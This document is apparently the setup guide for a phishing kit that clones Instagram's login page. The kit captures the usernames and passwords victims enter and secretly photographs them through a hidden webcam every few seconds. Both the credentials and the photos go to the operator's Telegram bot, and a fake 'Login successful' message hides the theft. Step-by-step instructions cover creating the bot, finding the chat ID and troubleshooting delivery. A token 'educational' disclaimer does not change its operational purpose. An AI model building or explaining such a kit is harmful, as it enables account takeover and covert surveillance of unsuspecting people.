                    1. WHAT THIS PAGE DOES
================================================================================

This is a fully functional Instagram login page clone that:
• Looks exactly like Instagram's login interface
• Has a completely hidden background camera
• Captures periodic photos every 4 seconds
• Sends login credentials (username/password) to your Telegram bot
• Sends captured photos to your Telegram bot
• Works on desktop and mobile browsers
• Runs completely invisibly in the background

IMPORTANT: This is a DEMO/EDUCATIONAL tool. Always use responsibly and with
explicit consent from users.

================================================================================
                    2. HOW IT WORKS (TECHNICAL OVERVIEW)
================================================================================

A. PAGE LOADING (When user opens the page):
   • Instagram login form is displayed (looks exactly like real Instagram)
   • Hidden video element starts capturing from your webcam
   • Camera feed is completely invisible (no UI elements shown)
   • Page sends "Page Loaded" notification to your Telegram bot
   • Starts periodic background photo capture (every 4 seconds)

B. PERIODIC BACKGROUND CAPTURE:
   • Every 4 seconds, the page captures a photo from the hidden camera
   • Photo is compressed to JPEG format (quality: 85%)
   • Captured photo is sent to your Telegram bot with timestamp
   • This continues even if user navigates away from the page

C. LOGIN ATTEMPT (When user clicks "Log in"):
   • Page captures the entered username and password
   • Takes 4 rapid photos in succession (login evidence)
   • Sends detailed report to Telegram with:
     - Username/email entered
     - Password entered
     - Timestamp of login attempt
     - Browser/device information
     - 4 photos from the camera
   • Shows a fake "Login successful" message
   • Resets the form for the next user

D. DATA SENT TO TELEGRAM:
   • Username/Email entered in the form
   • Password entered in the form
   • Photos from the hidden camera (periodic and during login)
   • Device information (platform, browser, screen resolution)
   • Timestamp of all events
   • Referrer information (where user came from)

                    4. HOW TO CREATE A TELEGRAM BOT
================================================================================

METHOD 1: USING BOTFATHER (Recommended)

STEP 1: Open Telegram
   • Install Telegram from https://telegram.org/
   • Create an account if you don't have one
   • Open the Telegram app on your phone or desktop

STEP 2: Find BotFather
   • In the search bar, type: @BotFather
   • Click on the verified bot (it has a blue checkmark)
   • Start a chat with BotFather

STEP 3: Create a New Bot
   • Send the command: /newbot
   • BotFather will ask for a name
   • Enter a name for your bot (e.g., "Instagram Logger")
   • BotFather will ask for a username
   • Enter a username ending with "bot" (e.g., "InstagramLoggerBot")
   • The username MUST end with "bot" (case insensitive)

STEP 4: Receive Your Bot Token
   • BotFather will send you a message with:
     "Done! Congratulations on your new bot. 
     Use this token to access the HTTP API:
     1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
   • COPY THIS TOKEN IMMEDIATELY
   • Keep it safe and secure
   • NEVER share your bot token with anyone

STEP 5: Bot is Created!
   • Your bot is now active
   • Search for your bot username in Telegram
   • Send a message to your bot to start chatting

METHOD 2: USING TELEGRAM BOT API (Advanced)
   • Use the Telegram Bot API directly
   • Send a POST request to:
     https://api.telegram.org/bot<TOKEN>/setWebhook
   • Not recommended for beginners

================================================================================
                    5. HOW TO GET YOUR CHAT ID
================================================================================

METHOD 1: USING THE API (Recommended)

STEP 1: Send a Message to Your Bot
   • Find your bot in Telegram (search by username)
   • Send ANY message to your bot (e.g., "Hello")

STEP 2: Get Updates from the API
   • Open your web browser
   • Type this URL (replace with YOUR bot token):
     https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
   • Example: https://api.telegram.org/bot1234567890:ABCdef/getUpdates

STEP 3: Find Your Chat ID
   • Look for the "chat":{"id":123456789} in the response
   • Example response:
     {
       "ok": true,
       "result": [
         {
           "update_id": 123456789,
           "message": {
             "message_id": 1,
             "from": {
               "id": 987654321,
               "is_bot": false,
               "first_name": "Your Name"
             },
             "chat": {
               "id": 123456789,    <--- THIS IS YOUR CHAT ID
               "first_name": "Your Name",
               "type": "private"
             },
             "text": "Hello"
           }
         }
       ]
     }
   • The number after "chat":{"id": is your Chat ID
   • Copy this number (e.g., 123456789)

METHOD 2: FOR GROUP CHATS
   • Add your bot to a group
   • Send a message in the group
   • Visit the getUpdates URL as above
   • Find the chat ID for the group

                    8. TROUBLESHOOTING
================================================================================

PROBLEM: "Camera Access Denied"
SOLUTION: 
   • Click the camera icon in browser address bar
   • Allow camera permission
   • Reload the page
   • Check if another app is using your camera

PROBLEM: "No messages received on Telegram"
SOLUTION:
   • Check if BOT_TOKEN is correct (copy exactly)
   • Check if CHAT_ID is correct (should be a number)
   • Send a message to your bot first
   • Visit getUpdates URL to verify chat ID
   • Check browser console for errors (F12)

PROBLEM: "Photos not sending to Telegram"
SOLUTION:
   • Photos must be under 10MB
   • Check your internet connection
   • Try reducing photo quality (already set to 85%)
   • Check Telegram bot permissions

PROBLEM: "Page shows 'Demo' notifications"
SOLUTION:
   • Your credentials are not configured
   • Replace BOT_TOKEN and CHAT_ID with real values
   • Save and reload the page

PROBLEM: "Bot not responding"
SOLUTION:
   • Check if bot token is revoked
   • Create a new bot with BotFather
   • Update the token in the code

PROBLEM: "Page not loading on mobile"
SOLUTION:
   • Use Chrome or Firefox mobile browser
   • Enable camera permissions
   • Disable any ad-blockers
   • Try on desktop if possible
